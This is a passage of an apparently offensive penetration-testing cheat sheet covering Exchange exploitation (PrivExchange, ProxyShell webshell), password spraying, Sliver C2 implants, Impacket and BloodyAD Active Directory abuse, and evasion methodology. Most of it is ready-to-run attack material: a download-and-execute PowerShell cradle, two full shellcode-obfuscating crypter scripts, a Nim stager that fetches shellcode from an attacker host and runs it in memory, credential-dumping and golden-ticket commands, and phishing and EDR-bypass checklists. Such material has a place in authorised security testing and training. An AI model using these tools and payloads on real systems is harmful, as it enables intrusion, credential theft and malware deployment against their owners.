9.16.9 Exchange — PrivExchange

Exchange servers run with high AD privileges (WriteDacl on the domain object pre-2019 hardening). The EWS PushSubscription feature makes Exchange authenticate (as EXCHANGE$) to an attacker-controlled URL; relay that to LDAP on the DC and grant a controlled user DCSync rights.
  • Trigger: PushSubscription SOAP call to /EWS/Exchange.asmx pointing at the relay listener.
  • Relay target: ldap://[dc-ip] with --escalate-user to add DS-Replication-Get-Changes ACEs.
  • Requires any low-priv mailbox-enabled credential; patched by CVE-2019-1040 / Exchange split-permissions.
# 1) Relay Exchange auth to LDAP and escalate a user to DCSync rights
sudo impacket-ntlmrelayx -t ldap://[dc-ip] --escalate-user [user]

# 2) Coerce Exchange via EWS PushSubscription toward the relay host
python3 privexchange.py -ah [attacker-ip] [exchange-host] -u [user] -p [password] -d [domain]

# 3) DCSync with the now-privileged user
impacket-secretsdump '[domain]/[user]:[password]'@[dc-ip] -just-dc

9.16.10 Exchange — ProxyShell / ProxyLogon

Pre-auth RCE chains by Orange Tsai abusing the Exchange Client Access Service proxy; ProxyShell yields code execution as SYSTEM by exporting a webshell via New-MailboxExportRequest.
ChainCVEsEffect
ProxyLogonCVE-2021-26855 (SSRF), 26857, 26858, 27065Pre-auth SSRF → arbitrary file write → RCE
ProxyShellCVE-2021-34473, 34523, 31207Pre-auth path confusion → PowerShell → webshell as SYSTEM
# ProxyShell PoC — path-confusion to write an .aspx webshell
git clone https://github.com/mr-r3bot/Proxyshell-Exchange
python3 proxyshell.py -u https://[exchange-host]/ -e [user]@[domain]
# PoC URI: /autodiscover/[email protected]/mapi/nspi?&Email=autodiscover/autodiscover.json%3F@[domain]

nmap -p443 --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ [exchange-host]
# Version fingerprint for CVE matching
curl -k https://[exchange-host]/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application | grep -i version

9.16.11 Exchange — Mailbox & GAL Abuse

OWA/EWS access enables address-list harvesting, password spraying, and mailbox rule abuse for persistence or RCE. 
# MailSniper — Global Address List, then OWA/EWS password spray (Windows)
Get-GlobalAddressList -ExchHostname [exchange-host] -Username [user] -Password [password] -OutFile gal.txt
Invoke-PasswordSprayOWA -ExchHostname [exchange-host] -UserList gal.txt -Password "[password]" -OutFile creds.txt

# Ruler — autodiscover-based user/password spray and Outlook rule abuse (Linux)
./ruler-linux64 --domain [domain] --insecure brute --users gal.txt --passwords passwords.txt

# Dump the GAL from a valid OWA login (no client needed)
python3 emailextract.py -i [exchange-host] -u [user]@[domain] -p '[password]'

# Grant self Mailbox Import/Export role then write a webshell to disk (post-auth)
# New-ManagementRoleAssignment -Role "Mailbox Import Export" -User [user]@[domain]
# New-MailboxExportRequest -Mailbox [user]@[domain] -FilePath "\\localhost\c$\inetpub\wwwroot\aspnet_client\shell.aspx"

10. Utilities

10.1 Flags

Flags must be retrieved from an interactive remote shell — webshells and RDP sessions are not valid.

Get-ChildItem -Path C:\Users\ -Include local.txt,proof.txt,secret.txt -File -Recurse -ErrorAction SilentlyContinue

find / -type f \( -name "local.txt" -o -name "proof.txt" -o -name "secret.txt" \) 2>/dev/null

type proof.txt; ipconfig

cat proof.txt && ip a

10.2 Encode PowerShell Payloads

echo -en '[payload]' | iconv -t UTF-16LE | base64 -w 0

10.3 Downgrade to Local User

Useful when you hold an elevated local Administrator account that is outside the domain and need to execute commands in a domain context.

.\PsExec64.exe -accepteula -s -i cmd.exe

10.4 PowerView (AV Evasion)

Load an obfuscated PowerView variant into memory after bypassing AMSI, AppLocker, and CLM. Source: GitHub.

IEX (New-Object Net.WebClient).DownloadString('http://[ip]/PowerView.obs.ps1')

10.5 Encryptors

10.5.1 Shellcode Encryptor for .BINs

Reads a raw .bin shellcode file, XOR- or ROT-encodes it, and outputs a ready-to-paste C# or C++ byte array with the corresponding decode stub.

#!/usr/bin/python3

# Basic shellcode crypter for C# payloads
# By Cas van Cooten

import re
import platform
import argparse
import subprocess
from random import randint

if platform.system() != "Linux":
    exit("[x] ERROR: Only Linux is supported for this utility script.")

class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Parse input arguments
def auto_int(x):
    return int(x, 0)

parser = argparse.ArgumentParser()
parser.add_argument("path", help="the path to load the raw shellcode payload from", nargs='?', default="/tmp/payload.bin")
parser.add_argument("format", help="the language to format the output in ('cs' or 'cpp')", nargs='?', default="cs")
parser.add_argument("encoding", help="the encoding type to use ('xor' or 'rot')", nargs='?', default="xor")
parser.add_argument("key", help="the key to encode the payload with (integer)", type=auto_int, nargs='?', default=randint(1,255))
args = parser.parse_args()

# Generate the shellcode given the input path
print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload for path {bcolors.OKGREEN}{args.path}{bcolors.ENDC}.")
try:
    with open(args.path, "rb") as f:
        payload = f.read()

except:
    exit(f'{bcolors.BOLD}{bcolors.FAIL}[-] Cannot read file: {args.path}{bcolors.ENDC}')

# Format the output payload
if args.format == "cs":
    # Encode the payload with the chosen type and key
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Encoding payload with type {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{hex(args.key)}{bcolors.ENDC}")
    encodedPayload = []
    payloadFormatted = ""
    for byte in payload:
        byteInt = int(byte)

        if args.encoding == "xor":
            byteInt = byteInt ^ args.key
        elif args.encoding == "rot":
            byteInt = byteInt + args.key & 255
        else:
            exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid encoding type.{bcolors.ENDC}")

        encodedPayload.append("{0:#0{1}x}".format(byteInt,4))

    payLen = len(encodedPayload)
    encodedPayload = re.sub("(.{65})", "\\1\n", ','.join(encodedPayload), 0, re.DOTALL)
    payloadFormatted += f"// Payload {args.encoding}-encoded with key {hex(args.key)}\n"
    payloadFormatted += f"byte[] buf = new byte[{str(payLen)}] {{\n{encodedPayload.strip()}\n}};"
    if payLen > 1000:
        f = open("/tmp/payload.txt", "w")
        f.write(payloadFormatted)
        f.close()
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+]{bcolors.OKBLUE} Encoded payload written to {bcolors.OKGREEN}/tmp/payload.txt{bcolors.OKBLUE} in CSharp format!{bcolors.ENDC}")
    else:
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+]{bcolors.OKBLUE} Encoded payload (CSharp):{bcolors.ENDC}")
        print(payloadFormatted + "\n")

    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Decoding function:{bcolors.ENDC}")
    if args.encoding == "xor":
        decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
    {{
        buf[i] = (byte)((uint)buf[i] ^ {hex(args.key)});
    }}"""

    if args.encoding == "rot":
        decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
    {{
        buf[i] = (byte)(((uint)buf[i] - {hex(args.key)}) & 0xFF);
    }}"""

    print(decodingFunc)

elif args.format == "cpp":
    # Encode the payload with the chosen type and key
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Encoding payload with type {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{hex(args.key)}{bcolors.ENDC}")
    encodedPayload = []
    payloadFormatted = ""
    for byte in payload:
        byteInt = int(byte)

        if args.encoding == "xor":
            byteInt = byteInt ^ args.key
        elif args.encoding == "rot":
            byteInt = byteInt + args.key & 255
        else:
            exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid encoding type.{bcolors.ENDC}")

        encodedPayload.append(f"\\x{byteInt:02x}")

    payLen = len(encodedPayload)
    encodedPayload = re.sub("(.{68})", "    \"\\1\"\n", ''.join(encodedPayload), 0, re.DOTALL)
    payloadFormatted += f"// Payload {args.encoding}-encoded with key {hex(args.key)}\n"
    payloadFormatted += f"unsigned char buffer[] = \n    {encodedPayload.strip()};"
    if payLen > 1000:
        f = open("/tmp/payload.txt", "w")
        f.write(payloadFormatted)
        f.close()
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+]{bcolors.OKBLUE} Encoded payload written to {bcolors.OKGREEN}/tmp/payload.txt{bcolors.OKBLUE} in C++ format!{bcolors.ENDC}")
    else:
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+]{bcolors.OKBLUE} Encoded payload (C++):{bcolors.ENDC}")
        print(payloadFormatted + "\n")

    # Provide the decoding function for the heck of it
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Decoding function:{bcolors.ENDC}")
    if args.encoding == "xor":
        decodingFunc = f"""char bufferx[sizeof buffer];
int i;
for (i = 0; i < sizeof bufferx; ++i)
    bufferx[i] = (char)(buffer[i] ^ {hex(args.key)});
        """

    if args.encoding == "rot":
        decodingFunc = f"""char bufferx[sizeof buffer];
int i;
for (i = 0; i < sizeof bufferx; ++i)
    bufferx[i] = (char)(buffer[i] - {hex(args.key)} & 255);
        """

    print(decodingFunc)

else:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid formatting type (choose 'cs' for CSharp or 'cpp' for C++).{bcolors.ENDC}")

10.5.2 Shellcode Encryptor for Meterpreter

Calls msfvenom internally to generate shellcode, then XOR- or ROT-encodes it and outputs a C# or C++ byte array with decode stub.

#!/usr/bin/python3

# Basic shellcode crypter for C# payloads
# By Cas van Cooten

import re
import platform
import argparse
import subprocess
from random import randint

if platform.system() != "Linux":
    exit("[x] ERROR: Only Linux is supported for this utility script.")

class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# Parse input arguments
def auto_int(x):
    return int(x, 0)

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP to use")
parser.add_argument("lport", help="listener port to use")
parser.add_argument("format", help="the language to format the output in ('cs' or 'cpp')", nargs='?', default="cs")
parser.add_argument("encoding", help="the encoding type to use ('xor' or 'rot')", nargs='?', default="xor")
parser.add_argument("key", help="the key to encode the payload with (integer)", type=auto_int, nargs='?', default=randint(1,255))
parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/meterpreter/reverse_tcp)", nargs='?', default="windows/x64/meterpreter/reverse_tcp")
args = parser.parse_args()

# Generate the shellcode given the preferred payload
print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "csharp"], stdout=subprocess.PIPE)

if result.returncode != 0:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")

# Get the payload bytes and split them
payload = re.search(r"{([^}]+)}", result.stdout.decode("utf-8")).group(1).replace('\n', '').split(",")

# Format the output payload
if args.format == "cs":
    # Encode the payload with the chosen type and key
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Encoding payload with type {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{args.key}{bcolors.ENDC}")
    for i, byte in enumerate(payload):
        byteInt = int(byte, 16)

        if args.encoding == "xor":
            byteInt = byteInt ^ args.key
        elif args.encoding == "rot":
            byteInt = byteInt + args.key & 255
        else:
            exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid encoding type.{bcolors.ENDC}")

        payload[i] = "{0:#0{1}x}".format(byteInt,4)

    payLen = len(payload)
    payload = re.sub("(.{65})", "\\1\n", ','.join(payload), 0, re.DOTALL)
    payloadFormatted = f"// msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f csharp\n"
    payloadFormatted += f"// {args.encoding}-encoded with key {hex(args.key)}\n"
    payloadFormatted += f"byte[] buf = new byte[{str(payLen)}] {{\n{payload.strip()}\n}};"
    if payLen > 1000:
        f = open("/tmp/payload.txt", "w")
        f.write(payloadFormatted)
        f.close()
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload written to '/tmp/payload.txt' in CSharp format!{bcolors.ENDC}")
    else:
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload (CSharp):{bcolors.ENDC}")
        print(payloadFormatted + "\n")

    # Provide the decoding function for the heck of it
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Decoding function:{bcolors.ENDC}")
    if args.encoding == "xor":
        decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
    {{
        buf[i] = (byte)((uint)buf[i] ^ {hex(args.key)});
    }}"""

    if args.encoding == "rot":
        decodingFunc = f"""for (int i = 0; i < buf.Length; i++)
    {{
        buf[i] = (byte)(((uint)buf[i] - {hex(args.key)}) & 0xFF);
    }}"""

    print(decodingFunc)

elif args.format == "cpp":
    # Encode the payload with the chosen type and key
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Encoding payload with type {bcolors.OKGREEN}{args.encoding}{bcolors.OKBLUE} and key {bcolors.OKGREEN}{args.key}{bcolors.ENDC}")
    encodedPayload = []
    for byte in payload:
        byteInt = int(byte, 16)

        if args.encoding == "xor":
            byteInt = byteInt ^ args.key
        elif args.encoding == "rot":
            byteInt = byteInt + args.key & 255
        else:
            exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid encoding type.{bcolors.ENDC}")

        encodedPayload.append(f"\\x{byteInt:02x}")

    payLen = len(encodedPayload)
    payload = re.sub("(.{64})", "    \"\\1\"\n", ''.join(encodedPayload), 0, re.DOTALL)
    payloadFormatted  = f"// msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f csharp\n"
    payloadFormatted += f"// {args.encoding}-encoded with key {hex(args.key)}\n"
    payloadFormatted += f"unsigned char buffer[] =\n    {payload.strip()};"
    if payLen > 1000:
        f = open("/tmp/payload.txt", "w")
        f.write(payloadFormatted)
        f.close()
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload written to '/tmp/payload.txt' in C++ format!{bcolors.ENDC}")
    else:
        print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload (C++):{bcolors.ENDC}")
        print(payloadFormatted + "\n")

    # Provide the decoding function for the heck of it
    print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Decoding function:{bcolors.ENDC}")
    if args.encoding == "xor":
        decodingFunc = f"""char bufferx[sizeof buffer];
int i;
for (i = 0; i < sizeof bufferx; ++i)
    bufferx[i] = (char)(buffer[i] ^ {hex(args.key)});
        """

    if args.encoding == "rot":
        decodingFunc = f"""char bufferx[sizeof buffer];
int i;
for (i = 0; i < sizeof bufferx; ++i)
    bufferx[i] = (char)(buffer[i] - {hex(args.key)} & 255);
        """

    print(decodingFunc)

else:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Invalid formatting type (choose 'cs' for CSharp or 'cpp' for C++).{bcolors.ENDC}")

10.6 RDP Connecting

10.6.1 Connecting Commands

# With credentials
xfreerdp3 /u:[user] /p:'[password]' /v:[ip] /dynamic-resolution +clipboard

rdesktop [ip] -u [user] -p [password] -g 80%+150+100

xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[ip] +clipboard /size:1920x1080 /drive:desktop,/home/[user]/Desktop

# Pass-the-Hash (NTLM)
xfreerdp /size:1920x1080 /v:[ip] /u:[user] /H:[hash] /cert:ignore /dynamic-resolution

# Through a proxy (internal network)
proxychains xfreerdp3 /u:[user] /p:'[password]' /v:[ip]

# Prompt for credentials interactively
rdesktop [ip]

10.6.2 Enable RDP If Disabled

# Check NLA/RDP status (1 = disabled)
$ComputerName = hostname
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired

# Disable NLA (allow RDP)
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)

# Re-enable NLA
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(1)

# Enable RDP system-wide
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

# Add local user to RDP group
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "[user]"

# Add AD user to RDP group
Add-ADGroupMember -Identity "Remote Desktop Users" -Members "[domain]\[user]"

# Alternative
net localgroup "Remote Desktop Users" "[domain]\[user]" /add

# Enable RDP Pass-the-Hash
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force

# Check and enable firewall rule for RDP (port 3389)
Get-NetFirewallRule -DisplayGroup "Remote Desktop"
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Create a new AD user and grant RDP access
New-ADUser -Name "[user]" -AccountPassword (ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "Remote Management Users" -Members [user]
Add-ADGroupMember -Identity "Administrators" -Members [user]
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

rdesktop -u [user] -p 'P@ssword123!' -d [domain] [ip]

10.7 Sliver C2

BishopFox open-source C2 framework written in Go. Supports HTTP/S, mTLS, DNS, and named-pipe transports; implants run as beacons (async interval callbacks) or sessions (interactive).

10.7.1 Setup

# Download and start server (first run unpacks assets — allow ~2 min)
wget -q https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux && ./sliver-server_linux

# Generate an operator profile and enable multiplayer (server console)
new-operator -n [operator] -l [attacker-ip]
multiplayer

# Download client, import operator config, connect
wget -q https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux
chmod +x sliver-client_linux
./sliver-client_linux import [operator]_[attacker-ip].cfg
./sliver-client_linux

10.7.2 Listeners

Protocol Command
HTTP http --lhost [attacker-ip] --lport 80
HTTPS https --lhost [attacker-ip] --lport 443
mTLS mtls --lhost [attacker-ip] --lport 4433
DNS dns --domains [c2-domain]
WireGuard wg
List active listeners jobs

10.7.3 Implant Generation

# Beacon (async) — HTTP, EXE, symbol-obfuscated (default, ~17 MB)
generate beacon --http [attacker-ip]:[port] --os windows -N [name]

# Beacon — fast build, skip symbol obfuscation (~11 MB, strings exposed)
generate beacon --http [attacker-ip]:[port] --os windows --skip-symbols -N [name]

# Beacon — custom interval (60s) + jitter (15s)
generate beacon --http [attacker-ip]:[port] --seconds 60 --jitter 15 --os windows -N [name]

# Session (interactive) — HTTPS
generate --https [attacker-ip]:[port] --os windows -N [name]

# Shellcode output format (for stager delivery)
generate beacon --http [attacker-ip]:[port] --format shellcode --os windows -N [name]

# Named-pipe pivot implant (requires active session on pivot host)
# 1. Start pivot listener on compromised host:
pivots named-pipe --bind [pipe-name]
# 2. Generate implant pointing at pivot, not C2:
generate --named-pipe [pivot-ip]/pipe/[pipe-name] --skip-symbols -N [pivot-implant]

# List generated implants / regenerate saved build
implants
regenerate [name]

10.7.4 Staging — Nim Stager

Create a profile and stage-listener so the shellcode payload is served over TCP. The Nim stager below fetches raw shellcode over HTTP and executes it in-process via VirtualAllocEx.

# 1. Create shellcode profile
profiles new --http [attacker-ip]:[c2-port] --format shellcode [profile-name]
# 2. Start TCP stage-listener (serves the shellcode blob)
stage-listener --url tcp://[attacker-ip]:[stage-port] --profile [profile-name]
# 3. Start HTTP C2 listener
http -L [attacker-ip] -l [c2-port]

import winim/lean
import httpclient

func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

proc DownloadExecute(url: string): void =
  var client = newHttpClient()
  var response: string = client.getContent(url)

  var shellcode: seq[byte] = toByteSeq(response)
  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
  defer: CloseHandle(pHandle)

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, addr shellcode[0], len(shellcode))

  let f = cast[proc() {.nimcall.}](rPtr)
  f()

when defined(windows):
  when isMainModule:
    DownloadExecute("http://[attacker-ip]:[stage-port]")

# Cross-compile stager for Windows (from Linux)
nim c -d:mingw --app:gui -d:release -o:stager.exe nim_stager.nim

10.7.6 Execute-Assembly & Armory

# Install all armory extensions (Rubeus, Seatbelt, SharpHound v4, SharpView, Certify, etc.)
armory install all
# Install single extension
armory install [name]

# Run .NET assembly in child process (default host: notepad.exe)
execute-assembly /path/to/[tool].exe [args]
# Specify a less-suspicious host process
execute-assembly -p explorer.exe /path/to/[tool].exe [args]
# In-process execution with AMSI + ETW bypass (no child spawned)
execute-assembly --in-process --amsi-bypass --etw-bypass /path/to/[tool].exe [args]

# Common armory tool invocations (-- separates Sliver flags from tool args)
seatbelt -- -group=system

sharphound-v4 -- --CollectionMethods All --ZipFileName loot.zip

10.7.7 Pivoting

# SOCKS5 proxy through active session (session mode only)
socks5 start -P 1080
# Update proxychains
sudo sed -i 's/socks4/socks5/g; s/9050/1080/g' /etc/proxychains.conf
# Route tools through proxy
proxychains [tool] [args]

# Chisel reverse SOCKS (beacon-compatible via forked extension)
# On attacker:
chisel server --reverse -p 1337 -v --socks5
# In Sliver beacon (after installing chisel extension):
chisel client [attacker-ip]:1337 R:socks

# Named-pipe pivot chain (Windows only)
# 1. On established session (pivot host), start pivot listener:
pivots named-pipe --bind [pipe-name]
# 2. Generate + deliver pivot implant pointing at pivot, not C2:
generate --named-pipe [pivot-host-ip]/pipe/[pipe-name] --skip-symbols -N [pivot-implant]
# 3. Deliver and execute pivot-implant on the next-hop target

10.8 Impacket Suite

Python network protocol library by SecureAuth. Core toolset for AD exploitation: remote execution, credential dumping, Kerberos abuse, and NTLM relay.

10.8.1 Remote Execution

Method Command
psexec (SC manager, SYSTEM) impacket-psexec [domain]/[user]:[pass]@[ip]
smbexec (no service binary on disk) impacket-smbexec [domain]/[user]:[pass]@[ip]
wmiexec (WMI, semi-interactive) impacket-wmiexec [domain]/[user]:[pass]@[ip]
atexec (Task Scheduler, single cmd) impacket-atexec [domain]/[user]:[pass]@[ip] "[cmd]"
Pass-the-Hash (any exec method) impacket-wmiexec [domain]/[user]@[ip] -hashes :[NT]
Pass-the-Ticket KRB5CCNAME=[ticket.ccache] impacket-wmiexec -k -no-pass [domain]/[user]@[host]

10.8.2 Credential Dumping

# Remote SAM + LSA dump
impacket-secretsdump [domain]/[user]:[pass]@[ip]

# DCSync — pull NTDS hashes
impacket-secretsdump -just-dc-user [target-user] [domain]/[user]:[pass]@[dc-ip]
impacket-secretsdump -just-dc [domain]/[user]:[pass]@[dc-ip]

# Offline NTDS.dit parse (from shadow copy / backup)
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Pass-the-Hash dump
impacket-secretsdump -hashes :[NT] [domain]/[user]@[ip]

10.8.3 Kerberos

# AS-REP Roast (accounts with no pre-auth)
impacket-GetNPUsers [domain]/ -dc-ip [dc-ip] -no-pass -usersfile [users.txt] -format hashcat
impacket-GetNPUsers [domain]/[user]:[pass] -dc-ip [dc-ip] -request -format hashcat

# Kerberoast (SPN service accounts)
impacket-GetUserSPNs [domain]/[user]:[pass] -dc-ip [dc-ip] -request
impacket-GetUserSPNs [domain]/[user]:[pass] -dc-ip [dc-ip] -request -outputfile kerberoast_hashes.txt

# Request TGT and export to ccache
impacket-getTGT [domain]/[user]:[pass]
impacket-getTGT [domain]/[user] -hashes :[NT]
export KRB5CCNAME=[user].ccache

# Silver ticket (forge TGS for specific service)
impacket-ticketer -nthash [service-NT] -domain-sid [SID] -domain [domain] -spn [SPN] [user]
export KRB5CCNAME=[user].ccache

# Golden ticket
impacket-ticketer -nthash [krbtgt-NT] -domain-sid [SID] -domain [domain] [user]
export KRB5CCNAME=[user].ccache

10.8.4 NTLM Relay

# Relay to SMB — dump SAM of authenticated target
impacket-ntlmrelayx -tf [targets.txt] -smb2support

# Relay to LDAP — dump domain info / LAPS / ADCS
impacket-ntlmrelayx -t ldap://[dc-ip] -smb2support --dump-laps --dump-adcs

# Relay + execute command
impacket-ntlmrelayx -tf [targets.txt] -smb2support -c "[cmd]"

# Relay to LDAP — add machine account (for RBCD)
impacket-ntlmrelayx -t ldap://[dc-ip] -smb2support --add-computer [comp-name] [comp-pass]

# Coerce authentication (trigger incoming NTLM to relay)
impacket-printerbug [domain]/[user]:[pass] [target-ip] [attacker-ip]
impacket-dcomexec [domain]/[user]:[pass]@[target-ip] -object MMC20 -silentcommand

10.9 BloodyAD

Python command-line tool for Active Directory privilege escalation via LDAP. Wraps common AD abuse primitives: ACE manipulation, password reset, shadow credentials, and delegation attacks.

# Install
pip install bloodyAD

10.9.1 Enumeration

# List writable AD attributes / objects for current user
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] get writable

# Get object attributes
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] get object [target]
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] get object [computer] --attr ms-Mcs-AdmPwd
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] get object [user] --attr msDS-AllowedToActOnBehalfOfOtherIdentity

# List group members
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] get members [group]

# Read DACLs for object
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] get acl [target]

10.9.2 ACL & Object Abuse

# Force-change password (GenericAll / ForceChangePassword)
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] set password [target-user] [new-pass]

# Add user to group (GenericWrite / AddMember)
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] add groupMember "[group]" [target-user]

# Grant DCSync rights (WriteDacl on domain NC)
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] add dcsync [target-user]

# Grant GenericAll over an object
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] add genericAll "[target-dn]" "[grantee-dn]"

# Set RBCD — write msDS-AllowedToActOnBehalfOfOtherIdentity
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] set object [target-computer] msDS-AllowedToActOnBehalfOfOtherIdentity -v "[attacker-computer]$"

# Add machine account (useful for RBCD + silver ticket)
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] add computer [comp-name] [comp-pass]

10.9.3 Credential & Certificate Attacks

# Shadow credentials — write KeyCredentialLink (requires GenericWrite / GenericAll)
bloodyAD -u [user] -p [pass] -d [domain] --host [dc-ip] add shadowCredentials [target-user]
# Authenticate with .pfx to retrieve NT hash
certipy auth -pfx [target-user].pfx -dc-ip [dc-ip]

# Pass-the-Hash auth
bloodyAD -u [user] -p :[NT] -d [domain] --host [dc-ip] [command]

# Kerberos ticket auth
bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]

11. Methodology

11.1 Reconnaissance & Scanning

  • Full TCP/UDP scan of every in-scope host (nmap); map all services and entry points
  • Enumerate each exposed service (web, SMB, MSSQL, mail) for an initial foothold
  • Identify the external attack surface and any client-side opportunities
  • Confirm scope, in-scope IP ranges/domains, and rules of engagement before touching anything
  • Passive recon: gather email addresses, employee names, and naming conventions (OSINT, LinkedIn, breach data) for phishing and password spraying
  • Enumerate DNS: zone transfers, subdomains, MX/SPF/DMARC records, and external mail gateways
  • Fingerprint web apps (tech stack, CMS, frameworks, upload functions, auth portals) for an exploitable entry
  • Enumerate SMB shares, null sessions, and accessible files for credentials and internal recon data
  • Enumerate virtual hosts and TLS certificate SANs to discover additional services and internal hostnames
  • Record exact software versions; map each to known CVEs and public exploits

11.2 Initial Access & Client-Side Execution

  • Craft a client-side payload (Word macro / HTA / JScript) tailored to bypass AV & AMSI
  • Use a custom encrypted shellcode runner (C#, VBA, PowerShell) instead of raw msfvenom output
  • Add sandbox/AV checks, parent-PID spoofing, and process injection / migration into a trusted process
  • Deliver the payload and catch the initial (encrypted) callback; upgrade to a stable C2 / shell
  • Build a believable pretext and lure (invoice, HR notice, IT update) matched to the target organization
  • Choose a delivery channel that survives the mail gateway/proxy (link vs attachment, password-protected archive, HTTPS-hosted stager)
  • Stand up a staging/redirector server with valid TLS to host the second stage cleanly
  • Minimize trust prompts: signed containers, mark-of-the-web stripping, trusted file types
  • Where a service is vulnerable, gain code execution directly (web shell, deserialization, file upload, SSTI, RCE) as an alternative to client-side
  • Validate the foothold: confirm user context, host, integrity level, and outbound connectivity

11.3 Antivirus & Defense Evasion

  • Enumerate defenses: AV/EDR, AMSI, AppLocker, Constrained Language Mode (CLM), Defender
  • Bypass AMSI (in-memory patch / reflection) before loading PowerShell tooling
  • Bypass AppLocker / CLM via LOLBAS (InstallUtil, MSBuild, regsvr32), trusted folders, or custom runspaces
  • Encrypt / obfuscate shellcode & stagers (XOR, AES, custom loaders) to defeat static signatures
  • Blind defenses where possible: disable PPL for LSASS, patch ETW, remove Defender signatures
  • Identify the specific EDR/AV product and its hooks (loaded DLLs, drivers, services) before choosing an evasion path
  • Unhook userland API hooks by reloading a clean ntdll/kernel32 from disk or a known-good copy
